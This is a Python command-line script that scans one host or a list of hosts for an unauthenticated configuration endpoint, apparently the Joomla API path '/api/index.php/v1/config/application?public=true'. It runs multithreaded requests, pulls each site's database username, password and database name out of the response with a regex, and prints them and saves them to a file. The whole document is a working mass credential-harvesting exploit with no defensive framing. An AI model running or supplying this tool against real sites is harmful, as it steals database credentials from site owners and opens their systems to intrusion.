import argparse
import re
from typing import List, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


class URLScanner:
    def __init__(self, url_list: List[str], output_file: Optional[str], endpoint: str = "/api/index.php/v1/config/application?public=true", timeout: int = 2, max_threads: int = 10) -> None:
        self.url_list: List[str] = url_list
        self.output_file: Optional[str] = output_file
        self.regex: re.Pattern = re.compile(r'"user":"(.*?)".*?"password":"(.*?)".*?"db":"(.*?)"')
        self.endpoint: str = endpoint
        self.timeout: int = timeout
        self.max_threads: int = max_threads

    def scan_url(self, url: str) -> None:
        try:
            response = requests.get(f"http://{url}{self.endpoint}", timeout=self.timeout)

            if response.ok:
                match = self.regex.search(response.text)
                if match:
                    user, password, db = match.groups()
                    if user and password and db:
                        print(f"[+] => Vulnerable {url}")
                        print(f"User: {user} Password: {password} Database: {db}")
                        if self.output_file:
                            with open(self.output_file, "a+") as f:
                                f.write(f"{url} user:{user} password:{password} database:{db}\n")
                            print(f"File Saved => {self.output_file}")
                    else:
                        print(f"[-] => User, password, or database is empty for {url}")
                else:
                    print(f"[-] => Not Vulnerable {url}")
        except requests.exceptions.RequestException as e:
            print(f"[-] => Error occurred for {url}: {e}")

    def scan(self) -> None:
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            for url in self.url_list:
                futures.append(executor.submit(self.scan_url, url))

            for future in as_completed(futures):
                future.result()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    url_group = parser.add_mutually_exclusive_group(required=True)
    url_group.add_argument("-u", "--url", type=str, help="URL to scan")
    url_group.add_argument("-f", "--file", type=str, help="Path to the file containing URLs to scan")
    parser.add_argument("-o","--output_file", type=str, help="Path to the output file (optional)")
    parser.add_argument("-e","--endpoint", type=str, default="/api/index.php/v1/config/application?public=true", help="Endpoint to scan (default: /api/index.php/v1/config/application?public=true)")
    parser.add_argument("-t","--timeout", type=int, default=2, help="Timeout in seconds (default: 2)")
    parser.add_argument("-m","--max_threads", type=int, default=10, help="Maximum number of threads (default: 10)")
    args = parser.parse_args()

    if args.url:
        url_list: List[str] = [args.url]
    else:
        with open(args.file) as f:
            url_list: List[str] = [line.strip() for line in f.readlines()]

    scanner: URLScanner = URLScanner(url_list, args.output_file, endpoint=args.endpoint, timeout=args.timeout, max_threads=args.max_threads)
    scanner.scan()
